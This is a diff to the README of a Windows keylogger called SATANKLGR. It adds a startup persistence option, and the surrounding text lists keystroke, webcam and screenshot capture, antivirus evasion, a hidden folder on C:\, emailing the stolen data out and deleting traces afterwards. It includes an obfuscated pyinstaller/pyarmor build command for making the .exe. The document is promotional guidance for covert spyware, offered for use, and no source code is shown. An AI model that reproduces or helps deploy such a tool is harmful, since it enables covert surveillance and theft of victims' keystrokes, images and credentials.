@@ -13,6 +13,7 @@ CAUSED BY THIS PROGRAM.
 + Keystrokes
 + Webcam
 + Screenshots
++ Persistence
 
 ## Intended for:
 Windows systems of all versions
@@ -43,6 +44,7 @@ python3 launcher.py
 This application intended only for Windows Systems. In order to make an .exe file you have to launch ```launcher.py``` only on Windows.
 Besides, you need to have python 3.9.0 installed on your PC. Currently it is impossible to make an .exe file of OpenCV using the latest version of pyinstaller
 and pyarmor. It is possible to run SATANKLGR on Linux, however you will get only .py file with source code. Afterwards you can go to Windows and compile file to .exe using ```pyarmor pack --clean -e "--onefile --icon default.ico" SATANKLGR.py```
+If you need to add keylogger to StartUp use file ```addtosturtup.py```. There were some problems with compiling .exe file in one main file.
 
 # Advantages
 + Compatible with all versions of Windows including Windows 10
@@ -52,6 +54,7 @@ and pyarmor. It is possible to run SATANKLGR on Linux, however you will get only
 + Not detected by antiviruses
 + Making hidden foulder in C:\ disk
 + Authomatical removing files after sending to email
++ Adding to StartUp (optional)
 
 # Terminating Keylogger
 So as to terminate the session of keylogger launch ```terminate.bat```
@@ -81,3 +84,7 @@ So as to terminate the session of keylogger launch ```terminate.bat```
 ![explorer_idvTX28Ly4](https://user-images.githubusercontent.com/92334349/147340598-a9accbd0-299d-4ce4-9c72-136715023bef.png)
 
 ![explorer_7IR4bL2EQP](https://user-images.githubusercontent.com/92334349/147340604-1b5dbc9a-66fc-4711-ab09-668f66a201d1.png)
+
+
+## Contacts
+If you have any suggestions concerning this project refer to vidiksmirka@gmail.com
